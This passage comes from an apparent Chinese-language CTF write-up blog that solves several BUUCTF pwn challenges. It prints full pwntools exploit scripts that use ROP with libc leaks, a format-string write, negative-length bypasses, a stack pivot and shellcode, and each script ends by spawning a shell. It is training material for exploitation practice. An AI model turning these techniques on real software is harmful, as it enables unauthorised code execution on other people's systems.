class="line">from LibcSearcher import *</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,27246)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;bjdctf_2020_babyrop&#39;)</span><br><span class="line">pop_rdi &#x3D; 0x0000000000400733</span><br><span class="line">pop_rsi &#x3D; 0x0000000000400731</span><br><span class="line">main_addr &#x3D; 0x4006AD</span><br><span class="line">puts_plt&#x3D;elf.plt[&#39;puts&#39;]</span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Pull up your sword and tell me u story!\n&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x20+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)  </span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_got_addr &#x3D; u64(p.recvline()[:-1].ljust(8,&#39;\x00&#39;))</span><br><span class="line">print hex(puts_got_addr)</span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;puts&#39;,puts_got_addr)</span><br><span class="line">libc_base &#x3D; puts_got_addr - libc.dump(&#39;puts&#39;)</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">bin_sh_addr &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Pull up your sword and tell me u story!\n&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x20+8) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><h2 id="checksec和查看运行流程-8"><a href="#checksec和查看运行流程-8" class="headerlink" title="checksec和查看运行流程"></a>checksec和查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813095646322.png?raw=true" alt="image-20210813095646322.png"></p>
<p>32位程序只开了NX保护</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813095724982.png?raw=true" alt="image-20210813095724982.png"></p>
<p>经过几次尝试发现第一次输入的大小不能超过32，否则报错</p>
<p>输入适合大小后会进行第二次输入，并且第二次输入完之后会打印输入的内容</p>
<h2 id="利用IDA分析-9"><a href="#利用IDA分析-9" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813100842139.png?raw=true" alt="image-20210813100842139.png"></p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813100859501.png?raw=true" alt="image-20210813100859501.png"></p>
<p>这里大概就是对于我们第一次输入大小的判断了，我们发现这里的v4是字符，那么我们也许可以用负数来绕过检测</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813100951492.png?raw=true" alt="image-20210813100951492.png"></p>
<p>接下来这里的定义我是这么理解的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(_BYTE *)(v2 + a1) &#x3D; v4;</span><br><span class="line">首先 *(_BYTE *)(v2 + a1)这一句是将我们的a1作为首地址然后将以字节为单位数组化，这里的v2为i每一次getchar时i++，也就是说这时候我们的数组时一步步向增加的也就是填充数组的过程</span><br></pre></td></tr></table></figure>

<p>  <img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813101300791.png?raw=true" alt="image-20210813101300791.png"></p>
<p>我们从vul函数中发现nptr的距离栈底的距离为0x2c</p>
<h2 id="构思-9"><a href="#构思-9" class="headerlink" title="构思"></a>构思</h2><p>先利用负数来绕过输入大小的检查——-&gt;利用我们的输入造成栈溢出——-&gt;第一次利用栈溢出泄露地址——&gt;第二次溢出的时候get_shell</p>
<h2 id="EXP-11"><a href="#EXP-11" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">r &#x3D; remote(&#39;node4.buuoj.cn&#39;,28033)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn2_sctf_2016&#39;)</span><br><span class="line"></span><br><span class="line">printf_plt&#x3D;elf.plt[&#39;printf&#39;]</span><br><span class="line">printf_got&#x3D;elf.got[&#39;printf&#39;]</span><br><span class="line">main&#x3D;elf.sym[&#39;main&#39;]</span><br><span class="line"></span><br><span class="line">r.recvuntil(&#39;How many bytes do you want me to read? &#39;)</span><br><span class="line">r.sendline(&#39;-1&#39;)</span><br><span class="line">r.recvuntil(&#39;\n&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*(0x2c+4)+p32(printf_plt)+p32(main)+p32(printf_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&#39;\n&#39;)</span><br><span class="line">printf_addr&#x3D;u32(r.recv(4))</span><br><span class="line">print hex(printf_addr)</span><br><span class="line">libc&#x3D;LibcSearcher(&#39;printf&#39;,printf_addr)</span><br><span class="line"></span><br><span class="line">offset&#x3D;printf_addr-libc.dump(&#39;printf&#39;)</span><br><span class="line">system&#x3D;offset+libc.dump(&#39;system&#39;)</span><br><span class="line">bin_sh&#x3D;offset+libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&#39;How many bytes do you want me to read? &#39;)</span><br><span class="line">r.sendline(&#39;-1&#39;)</span><br><span class="line">r.recvuntil(&#39;\n&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*(0x2c+4)+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h3><p>这里我们要注意在32位的程序中我们可以直接利用栈来修改寄存器里面的值</p>
<p>但在64位中我们需要利用‘小积木’来修改寄存器，并且对于printf函数来说，在64为中要控制两个参数<strong>format_str和内容</strong></p>
<h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,26314)</span><br><span class="line">x_addr &#x3D; 0x0804A02C</span><br><span class="line">sleep(0.1)</span><br><span class="line"></span><br><span class="line">payload &#x3D; p32(x_addr) + &#39;%11$n&#39;</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()	</span><br></pre></td></tr></table></figure>

<p>格式化字符串漏洞</p>
<h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><h2 id="checksec和查看运行流程-9"><a href="#checksec和查看运行流程-9" class="headerlink" title="checksec和查看运行流程"></a>checksec和查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813104019151.png?raw=true" alt="image-20210813104019151.png"></p>
<p>64位的程序并且只看了NX</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813104104305.png?raw=true" alt="image-20210813104104305.png"></p>
<p>进行两次输入，第一次输入的是第二次输入大小接收的大小</p>
<h2 id="利用IDA分析-10"><a href="#利用IDA分析-10" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813104428643.png?raw=true" alt="image-20210813104428643.png"></p>
<p>我们发现我们第一次输入的数据，显示被定义为有符号数在接下来又被定义为无符号数</p>
<h2 id="构思-10"><a href="#构思-10" class="headerlink" title="构思"></a>构思</h2><p>输入负数绕过第一次的长度检测，第二次时因为整数溢出漏洞导致栈溢出漏洞出现</p>
<p>利用栈溢出来泄露地址并获取shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;bjdctf_2020_babystack2&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,27568)</span><br><span class="line">backdoor &#x3D;  0x400726</span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line">p.sendline(&#39;-1&#39;)</span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x10+8) + p64(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()	</span><br></pre></td></tr></table></figure>

<h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h2><h2 id="checksec和查看运行流程-10"><a href="#checksec和查看运行流程-10" class="headerlink" title="checksec和查看运行流程"></a>checksec和查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813104311006.png?raw=true" alt="image-20210813104311006.png"></p>
<p>64位且只看了NX</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813104330559.png?raw=true" alt="image-20210813104330559.png"></p>
<p>进行一次输入，并且会打印一遍</p>
<h2 id="利用IDA分析-11"><a href="#利用IDA分析-11" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813104601511.png?raw=true" alt="image-20210813104601511.png"></p>
<p>这里buf的大小明显小于写入的大小，存在栈溢出漏洞</p>
<h2 id="构思-11"><a href="#构思-11" class="headerlink" title="构思"></a>构思</h2><p>利用负数绕过长度检测—–&gt;利用整型溢出制造栈溢出—–&gt;第一次利用栈溢出泄露地址——&gt;第二次里哟个栈溢出获取shell</p>
<h2 id="EXP-12"><a href="#EXP-12" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;babyrop2&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;babyrop2&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">printf_got &#x3D; elf.got[&#39;printf&#39;]</span><br><span class="line">printf_plt &#x3D; elf.plt[&#39;printf&#39;]</span><br><span class="line">pop_rdi &#x3D; 0x0000000000400733</span><br><span class="line">main_addr &#x3D; 0x400636 </span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x20 + 8) + p64(pop_rdi) + p64(printf_got) + p64(printf_plt) + p64(main_addr) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line">printf_addr &#x3D; u64(p.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print hex(printf_addr)</span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;printf&#39;,printf_addr)</span><br><span class="line">libc_base  &#x3D; printf_addr - libc.dump(&#39;printf&#39;)</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">bin_sh_addr &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x28 + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr) + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><h2 id="checksec和查看运行流程-11"><a href="#checksec和查看运行流程-11" class="headerlink" title="checksec和查看运行流程"></a>checksec和查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813104944416.png?raw=true" alt="image-20210813104944416.png"></p>
<p>32位的程序只开了NX保护</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813105245248.png?raw=true" alt="image-20210813105245248.png"></p>
<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813111508032.png?raw=true" alt="image-20210813111508032.png"></p>
<p>因为栈溢出的字节不够，所以需要栈转移但这时候我们就需要知道栈的地址</p>
<p>从网上借鉴了一个方法：</p>
<p>泄露ebp<br>printf函数在输出的时候遇到’\0‘会停止，如果我们将参数s全部填满，这样就没法在末尾补上’\0‘，那样就会将ebp连带着输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;a&#39;*0x20 + &#39;bbbbbbbb&#39;</span><br></pre></td></tr></table></figure>

<p>这里书写的bbbbbbb时为了方便定位</p>
<h2 id="构思-12"><a href="#构思-12" class="headerlink" title="构思"></a>构思</h2><p>利用printf泄露ebp的地址—-&gt;利用栈溢出实现栈转移—-&gt;获取shell</p>
<h2 id="EXP-13"><a href="#EXP-13" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p &#x3D; remote(&#39;node4.buuoj.cn&#39;,27009)</span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;ciscn_2019_es_2&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,27792)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">system_addr &#x3D; 0x08048400</span><br><span class="line">leave_ret &#x3D; 0x080484b8</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;name?\n&quot;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x20 + &#39;bbbbbbbb&#39;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(&#39;bbbbbbbb&#39;)</span><br><span class="line">stack_addr &#x3D; u32(p.recv(4)) - 56</span><br><span class="line">print(&#39;stack_addr:&#39;,hex(stack_addr))</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;aaaa&quot; + p32(system_addr) + &quot;aaaa&quot; + p32(stack_addr+0x14) + &quot;aaaa&quot; + &quot;&#x2F;bin&#x2F;sh\x00&quot;</span><br><span class="line">payload &#x3D; payload.ljust(0x28,&quot;a&quot;)</span><br><span class="line">payload +&#x3D; p32(stack_addr) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="小疑惑"><a href="#小疑惑" class="headerlink" title="小疑惑"></a>小疑惑</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &quot;aaaa&quot; + p32(system_addr) + &quot;aaaa&quot; + p32(stack_addr+0x14) + &quot;aaaa&quot; + &quot;&#x2F;bin&#x2F;sh\x00&quot;</span><br></pre></td></tr></table></figure>

<p>为什么这里调用/bin/sh的时候不能直接写，而是利用 p32(stack_addr+0x14)来间接表示呢？<br>目前的理解：</p>
<p>程序开启了NX保护，那也就是栈上的内容不能执行，那么我们就不能直接写在栈上利用，而是应该利用间接调用（从栈上调用地址然后利用）</p>
<h1 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h1><h2 id="checksec和查看运行流程-12"><a href="#checksec和查看运行流程-12" class="headerlink" title="checksec和查看运行流程"></a>checksec和查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813112307427.png?raw=true" alt="image-20210813112307427.png"></p>
<p>32位程序且只看了NX</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813112347194.png?raw=true" alt="image-20210813112347194.png"></p>
<p>进行一次输入然后退出</p>
<h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813112418446.png?raw=true" alt="image-20210813112418446.png"></p>
<p>存在明显的栈溢出漏洞</p>
<p>但没有发现system等关键词</p>
<h2 id="构思-13"><a href="#构思-13" class="headerlink" title="构思"></a>构思</h2><p>利用栈溢出漏洞泄露地址——&gt;第二次利用栈溢出get_shell</p>
<h2 id="EXP-14"><a href="#EXP-14" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">#p &#x3D; process(&#39;level3&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,26166)</span><br><span class="line">elf &#x3D; ELF(&#39;level3&#39;)</span><br><span class="line">main_addr &#x3D; 0x8048484</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Input:\n&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x88 + 4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">write_addr &#x3D; u32(p.recv(4))</span><br><span class="line">print hex(write_addr)</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;write&#39;,write_addr)</span><br><span class="line">libc_base &#x3D; write_addr - libc.dump(&#39;write&#39;)</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">bin_sh_addr &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x88+4) + p32(system_addr) + &#39;aaaa&#39; + p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><h2 id="checksec和查看运行流程-13"><a href="#checksec和查看运行流程-13" class="headerlink" title="checksec和查看运行流程"></a>checksec和查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813112642780.png?raw=true" alt="image-20210813112642780.png"></p>
<p>32位的程序，保护只看了RELRO</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813112721437.png?raw=true" alt="image-20210813112721437.png"></p>
<p>程序刚开始会给出一个地址，然后进行一次输入再打印输入的内容，最后结束</p>
<h2 id="利用IDA分析-12"><a href="#利用IDA分析-12" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813115424416.png?raw=true" alt="image-20210813115424416.png"></p>
<h2 id="构思-14"><a href="#构思-14" class="headerlink" title="构思"></a>构思</h2><p>我们刚开始得到的地址是s所在栈的地址，那么我们利用栈溢出要跳转到哪里呢？<br>我们发现保护机制并没有开启NX那么我们是不是能够再s所在栈上写入shellcode然后利用栈溢出来跳转实现调用shellcode</p>
<p>我们需要做的是</p>
<p>1.算出dest距离栈底的距离</p>
<p>2.得到shellcode距离s栈段上的偏移</p>
<p>对于问题1：</p>
<p>我们新学到了一个计算方法（利用gdb）</p>
<p>首先利用gdb生成无序组合</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813120210751.png?raw=true" alt="image-20210813120210751.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;ez_pz_hackover_2016&#39;)</span><br><span class="line">#p &#x3D; remote(&#39;node4.buuoj.cn&#39;,26066)</span><br><span class="line">elf &#x3D; ELF(&#39;ez_pz_hackover_2016&#39;)</span><br><span class="line">#context(log_level &#x3D; &#39;debug&#39;,os&#x3D;&#39;linux&#39;,arch&#x3D;&#39;i386&#39;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Yippie, lets crash: &#39;)</span><br><span class="line">stack_addr &#x3D; int(p.recv(10),16)</span><br><span class="line">print hex(stack_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;crashme\x00&#39; + &#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#39;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>然后利用这个Exp来检测dest距离栈底的距离</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813120804704.png?raw=true" alt="image-20210813120804704.png"></p>
<p>算出dest距离栈底的偏移为14</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">那么我们可以知道dest栈顶到栈底的距离为8+14</span><br><span class="line">其中8为我们输入的‘&#39;crashme\x00&#39;，14刚刚我们算出的偏移，接下来还会又4字节的ebp地址，最后才是ret的地址</span><br></pre></td></tr></table></figure>

<p>那么接下来对于第二点我们要怎么知道shellcode出现的位置呢？</p>
<p>再利用gdb</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813121141127.png?raw=true" alt="image-20210813121141127.png"></p>
<p>利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context(log_level &#x3D; &#39;debug&#39;,os&#x3D;&#39;linux&#39;,arch&#x3D;&#39;i386&#39;)</span><br></pre></td></tr></table></figure>

<p>反馈的结果我们知道shellcode的首地址的字符是jhh，那么我们在gdb中搜索</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813121618933.png?raw=true" alt="image-20210813121618933.png"></p>
<p>最后利用我们得到的s的栈地址减去它现在所在的地址即可</p>
<h3 id="小技巧-3"><a href="#小技巧-3" class="headerlink" title="小技巧"></a>小技巧</h3><p>我们看栈上的内容的话可以直接利用语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&#x2F;40s $esp</span><br></pre></td></tr></table></figure>

<p>那么我们知道了这些就可以构造exp了</p>
<h2 id="EXP-15"><a href="#EXP-15" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p &#x3D; process(&#39;ez_pz_hackover_2016&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,26066)</span><br><span class="line">elf &#x3D; ELF(&#39;ez_pz_hackover_2016&#39;)</span><br><span class="line">#context(log_level &#x3D; &#39;debug&#39;,os&#x3D;&#39;linux&#39;,arch&#x3D;&#39;i386&#39;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Yippie, lets crash: &#39;)</span><br><span class="line">stack_addr &#x3D; int(p.recv(10),16)</span><br><span class="line">print hex(stack_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span 